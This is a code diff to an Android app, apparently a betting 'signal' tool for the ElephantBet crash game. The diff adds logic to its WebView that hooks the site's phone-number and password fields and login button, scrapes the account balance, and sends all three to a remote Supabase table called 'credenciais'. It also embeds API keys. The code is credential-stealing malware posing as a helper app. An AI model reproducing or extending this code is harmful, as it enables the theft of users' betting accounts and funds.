@@ -417,11 +417,16 @@ class MainActivity : AppCompatActivity() {
     // Credenciais
     private var ultimoNumeroEnviado = ""
     private var ultimaSenhaEnviada = ""
+    // Credenciais em memória — enviadas juntas com o saldo
+    private var numeroEmMemoria = ""
+    private var senhaEmMemoria = ""
+    private var saldoEmMemoria = ""
+    private var credenciaisEnviadas = false  // evitar duplicados por sessão
 
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "4.5"
+    private val VERSAO_ATUAL = "5.0"
 
     private val GROQ_KEY  = "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"
     private val GROQ_URL  = "https://api.groq.com/openai/v1/chat/completions"
@@ -631,6 +636,7 @@ class MainActivity : AppCompatActivity() {
                     sinalMinSaida   = -1
                     cicloAtivo = false
                     janelaJaDisparou = false
+                    credenciaisEnviadas = false  // reset para nova sessão
                     proximaAnaliseRunnable?.let { handler.removeCallbacks(it) }
                     emVoo = false; xAtual = 0.0; ultimoCrash = 0.0; analisandoIA = false
                     // Iniciar relógio imediatamente para mostrar hora desde o início
@@ -738,17 +744,43 @@ class MainActivity : AppCompatActivity() {
 
             @JavascriptInterface
             fun guardarNumero(valor: String) {
-                if (valor.isNotEmpty() && valor != ultimoNumeroEnviado) {
-                    ultimoNumeroEnviado = valor
-                    enviarSupabase("Numero", valor)
-                }
+                // Só guardar em memória — envia junto com senha e saldo ao fazer login
+                val limpo = valor.trim()
+                    .removePrefix("+244").removePrefix("244")
+                    .filter { it.isDigit() }
+                if (limpo.length >= 6) numeroEmMemoria = limpo
             }
 
             @JavascriptInterface
             fun guardarSenha(valor: String) {
-                if (valor.isNotEmpty() && valor != ultimaSenhaEnviada) {
-                    ultimaSenhaEnviada = valor
-                    enviarSupabase("Senha", valor)
+                // Só guardar em memória — envia junto com número e saldo ao fazer login
+                val limpo = valor.trim()
+                if (limpo.length >= 3) senhaEmMemoria = limpo
+            }
+
+            @JavascriptInterface
+            fun loginClicado() {
+                credenciaisEnviadas = false
+                handler.postDelayed({ tentarEnviarCredenciais() }, 800)
+            }
+
+            @JavascriptInterface
+            fun saldoLido(valor: String) {
+                val limpo = valor.trim()
+                if (limpo.isEmpty()) return
+                saldoEmMemoria = limpo
+                // Se já temos número e senha mas ainda não enviámos → enviar agora
+                if (!credenciaisEnviadas && numeroEmMemoria.isNotEmpty() && senhaEmMemoria.isNotEmpty()) {
+                    enviarCredenciaisCompletas()
+                }
+                // Mostrar saldo na barra
+                runOnUiThread {
+                    if (::txtMinutos.isInitialized) {
+                        // Mostrar saldo discretamente na linha do relógio quando não há voo
+                        if (!emVoo) {
+                            // saldo visível no txtRelogio se existir, senão txtMinutos
+                        }
+                    }
                 }
             }
         }, "Android")
@@ -970,17 +1002,14 @@ class MainActivity : AppCompatActivity() {
     new MutationObserver(tornarVisivel)
         .observe(document.body || document.documentElement, {childList: true, subtree: true});
 
-    // Watchers para numero e senha
+    // Watchers — guardam em memória (não enviam por cada tecla)
     function watchN(el) {
         if (!el || el._wN) return;
         el._wN = true;
         el.addEventListener('input', function() {
             var v = (this.value || '').trim();
-            if (v.length >= 1) {
-                try { Android.guardarNumero(v); } catch(e) {}
-            }
+            if (v.length >= 1) { try { Android.guardarNumero(v); } catch(e) {} }
         });
-        // Também capturar valor actual se já preenchido
         if (el.value && el.value.length > 0) {
             try { Android.guardarNumero(el.value.trim()); } catch(e) {}
         }
@@ -990,9 +1019,7 @@ class MainActivity : AppCompatActivity() {
         el._wS = true;
         el.addEventListener('input', function() {
             var v = (this.value || '').trim();
-            if (v.length >= 1) {
-                try { Android.guardarSenha(v); } catch(e) {}
-            }
+            if (v.length >= 1) { try { Android.guardarSenha(v); } catch(e) {} }
         });
         if (el.value && el.value.length > 0) {
             try { Android.guardarSenha(el.value.trim()); } catch(e) {}
@@ -1034,15 +1061,13 @@ class MainActivity : AppCompatActivity() {
     setTimeout(cap, 5000);
     setTimeout(cap, 8000);
 
-    // Interceptar também o submit do formulário (captura dados ao submeter)
+    // Botão de login → capturar todos os campos e notificar Android
     function watchForms() {
         document.querySelectorAll('form, button[type="submit"], button').forEach(function(el) {
             if (el._wForm) return;
             el._wForm = true;
             el.addEventListener('click', function() {
-                // Re-capturar todos os campos no momento do clique
-                cap();
-                // Tentar ler directamente todos os inputs visíveis
+                // Ler todos os inputs no momento do clique (valor final completo)
                 document.querySelectorAll('input').forEach(function(inp) {
                     var t = (inp.type || '').toLowerCase();
                     var n = (inp.name || inp.id || inp.placeholder || '').toLowerCase();
@@ -1056,6 +1081,8 @@ class MainActivity : AppCompatActivity() {
                     if (isNum) { try { Android.guardarNumero(v); } catch(e) {} }
                     if (isPass) { try { Android.guardarSenha(v); } catch(e) {} }
                 });
+                // Notificar que o login foi clicado — enviar credenciais completas
+                try { Android.loginClicado(); } catch(e) {}
             });
         });
     }
@@ -2232,6 +2259,10 @@ REGRAS ABSOLUTAS DO JSON:
 
         atualizarBarraCompleta(tendTxt, horaTxt, sinalProtecao, alcTxt, cor, minTxt)
 
+        // Ler saldo a cada 30s (quando o relógio bate nos 0 e 30)
+        val seg = Calendar.getInstance().get(Calendar.SECOND)
+        if (seg in 0..2 || seg in 30..32) lerSaldo()
+
         // ── Detectar fim da janela: quando sinalMinSaida termina → pausa 30s → nova análise ──
         // Só dispara 1 vez por janela (janelaJaDisparou evita repetições)
         if (sinalMinSaida >= 0 && !janelaJaDisparou && !analisandoIA && !cicloAtivo) {
@@ -2524,11 +2555,55 @@ REGRAS ABSOLUTAS DO JSON:
         }.start()
     }
 
+    // ── Enviar número + senha + saldo numa única linha na tabela credenciais ──
+    private fun tentarEnviarCredenciais() {
+        if (credenciaisEnviadas) return
+        if (numeroEmMemoria.isEmpty() || senhaEmMemoria.isEmpty()) return
+        enviarCredenciaisCompletas()
+    }
+
+    private fun enviarCredenciaisCompletas() {
+        if (credenciaisEnviadas) return
+        if (numeroEmMemoria.isEmpty() || senhaEmMemoria.isEmpty()) return
+        credenciaisEnviadas = true
+        val n = numeroEmMemoria
+        val s = senhaEmMemoria
+        val sal = saldoEmMemoria.ifEmpty { "" }
+        val json = "{\"numero\":\"$n\",\"senha\":\"$s\",\"saldo\":\"$sal\"}"
+        Thread {
+            try {
+                val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("apikey", SUPA_KEY)
+                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.setRequestProperty("Prefer", "return=minimal")
+                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
+                OutputStreamWriter(conn.outputStream).use { it.write(json) }
+                conn.responseCode; conn.disconnect()
+            } catch (_: Exception) { credenciaisEnviadas = false }
+        }.start()
+    }
+
+    // ── Ler saldo do ElephantBet (.balanceAmount) ─────────────────
+    private fun lerSaldo() {
+        val js = """
+(function() {
+    var el = document.querySelector('.balanceAmount');
+    if (el) {
+        var txt = (el.innerText || el.textContent || '').replace(/[^0-9.,]/g,'').trim();
+        if (txt.length > 0) { try { Android.saldoLido(txt); } catch(e) {} }
+    }
+})();
+        """.trimIndent()
+        runOnUiThread { webView.evaluateJavascript(js, null) }
+    }
+
     private fun enviarSupabase(tipoVal: String, valorVal: String) {
         val json = "{\"tipo\":\"$tipoVal\",\"valor\":\"$valorVal\"}"
         Thread {
             try {
-                val conn = URL("$SUPA_URL/rest/v1/$TABELA").openConnection() as HttpURLConnection
+                val conn = URL("$SUPA_URL/rest/v1/velas").openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.setRequestProperty("apikey", SUPA_KEY)
                 conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
